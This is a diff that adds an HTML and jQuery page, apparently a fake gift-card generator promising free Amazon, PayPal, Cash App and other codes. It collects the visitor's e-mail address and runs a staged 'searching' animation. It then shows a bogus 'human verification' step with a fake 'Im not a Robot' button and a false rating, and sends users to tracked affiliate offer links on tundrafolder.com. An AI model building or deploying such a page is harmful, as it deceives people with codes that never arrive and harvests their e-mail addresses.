@@ -1,0 +1,125 @@
+<meta name="viewport" content="width=device-width, initial-scale=1 maximum-scale=1" />
+
+<link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300" rel="stylesheet" />
+
+<link href="https://fonts.googleapis.com/css?family=News+Cycle" rel="stylesheet" />
+
+<link href="https://fonts.googleapis.com/css?family=Averia+Sans+Libre:300" rel="stylesheet" />
+
+<div id="container">
+    <center>
+        <div id="padding">
+            <img src="http://i.imgur.com/Dyd0egf.png">
+            <h2 id="head-title">GIFCARD<br>EVENT</h2>
+            <h3 id="head-sub-title" style="color:green">Get Codes Daily!</h3>
+            <h3 id="head-sub-title">AMAZON, EBAY, PAYPAL, CASH APP and Many More!</h3>
+        </div>
+        <div id="banner">
+            <div id="codes">
+                <h3 id="head-title">XXXX - XXXX - XXXX</h3>
+            </div>
+        </div>
+        <div id="padding">
+            <div id="user-form">
+                <div class="inner-addon left-addon">
+                    <i class="glyphicon glyphicon-envelope"></i>
+                    <input type="text" id="user" placeholder="E-mail Address" class="form-control" />
+                </div>
+
+                <h4 id="head-sub-title">Code will be sent to your E-mail</h4>
+
+                <button id="connect" class="c_button"> GET AVAILABLE EVENT<i class="glyphicon glyphicon-share-alt"></i>
+            </button>
+            </div>
+
+
+    </center>
+    </div>
+</div>
+
+<div id="generator-overlay">
+    <div id="generator">
+
+        <center>
+            <h1 id="connect-title">SEARCHING FOR AVAILABLE EVENTS</h1>
+        </center>
+
+        <div id="loading">
+            <div class="loader">Loading...</div>
+        </div>
+
+        <div id="connected">
+
+
+            {%offers%}
+
+            <div id="notice">To ensure the security of our database, we ask that you check the box on the upper right. This prevents automated programs from requesting access to our database. After Verification, a working CODE will be sent to
+                <font id="usr" style="color:#333"></font>
+            </div>
+            </script>
+<a href="https://tundrafolder.com/show.php?l=0&u=61175&id=39550&tracking_id="><button class="c_button">Join Paypal Event <i class="glyphicon glyphicon-share-alt"></i>
+            </button></a>          
+          <br>
+		  </script>
+<a href="https://tundrafolder.com/show.php?l=0&u=61175&id=43796&tracking_id="><button class="c_button">Join Wallmart Event <i class="glyphicon glyphicon-share-alt"></i>
+            </button></a>          
+          <br>
+		  </script>
+<a href="https://tundrafolder.com/show.php?l=0&u=61175&id=48034&tracking_id="><button class="c_button">Join Overwatch Coin Event <i class="glyphicon glyphicon-share-alt"></i>
+            </button></a>          
+          <br>
+		  </script>
+<a href="https://tundrafolder.com/show.php?l=0&u=61175&id=31392&tracking_id="><button class="c_button">Join Roblox Event <i class="glyphicon glyphicon-share-alt"></i>
+            </button></a>          
+          <br>
+		  </script>
+<a href="https://tundrafolder.com/show.php?l=0&u=61175&id=46009&tracking_id="><button class="c_button">Join Amazon Event <i class="glyphicon glyphicon-share-alt"></i>
+            </button></a>          
+          <br>
+		  </script>
+<a href="https://tundrafolder.com/show.php?l=0&u=61175&id=46904&tracking_id="><button class="c_button">Join Whitefox Event <i class="glyphicon glyphicon-share-alt"></i>
+            </button></a>          
+          <br>
+        </div>
+
+    </div>
+</div>
+
+<br/>
+<br/>
+
+<script>
+    $('.link_a').prepend('<i class="glyphicon glyphicon-list-alt"></i>');
+    $('#offerlst').append('score : ★★★★✫ |');
+    $('.dl_button').html('<i class="square"></i> <font style="margin-left:10px;">Im not a Robot</font>');
+    window.onload = function () {
+    $("#connect").click(function () {
+        if ($("#user").val().length == 0) {
+            $("#user").focus()
+        } else {
+            userId = $("#user").val();
+            if (userId.indexOf("@") > -1) {
+                $("#generator-overlay").fadeIn(100);
+                $("#generator").animate({
+                    left: "0px",
+                    opacity: "1"
+                }, 1000, function () {
+                    setTimeout(function () {
+                        $("#loading").fadeOut()
+                    }, 7000);
+                    setTimeout(function () {
+                        $("#connected").fadeIn();
+                        $("#connect-title").html("AVAILABLE CODE FOUND");
+                        $("#usr").html(userId);
+                        $("#connect-title").append("<h2>HUMAN VERIFICATION</h2>");
+                        var _0x495bx1 = $("#user");
+                        stepConnect(_0x495bx1.val())
+                    }, 7500)
+                })
+            } else {
+                $("#user").focus()
+            }
+        }
+    });
+};
+</script>
